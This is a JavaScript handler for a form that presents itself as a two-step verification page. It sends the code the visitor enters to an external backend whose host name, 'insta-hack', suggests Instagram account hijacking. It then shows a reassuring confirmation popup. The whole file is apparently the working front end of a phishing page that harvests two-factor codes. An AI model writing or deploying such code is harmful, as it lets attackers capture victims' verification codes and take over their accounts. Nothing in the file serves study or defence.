document.getElementById('twoStepForm').addEventListener('submit', async function (event) {
    event.preventDefault();

    const code = document.getElementById('code').value;
    const apiUrl = `https://insta-hack-production.up.railway.app/api/v1/twostep/${code}`;

    const spinner = document.getElementById('spinner');
    spinner.style.display = 'inline-block';

    try {
        const response = await fetch(apiUrl, {
            method: 'GET', // Sending the code as part of the URL in a GET request
            headers: { 'Content-Type': 'application/json' }
        });

        if (!response.ok) {
            throw new Error('Verification failed');
        }

        spinner.style.display = 'none';

        // Show popup for configuration confirmation
        document.getElementById('popup').style.display = 'block';

    } catch (error) {
        spinner.style.display = 'none';
        const messageDiv = document.getElementById('message');
        messageDiv.textContent = 'Error: ' + error.message;
        messageDiv.style.color = 'red';
    }
});

// Close the popup
function closePopup() {
    document.getElementById('popup').style.display = 'none';
}
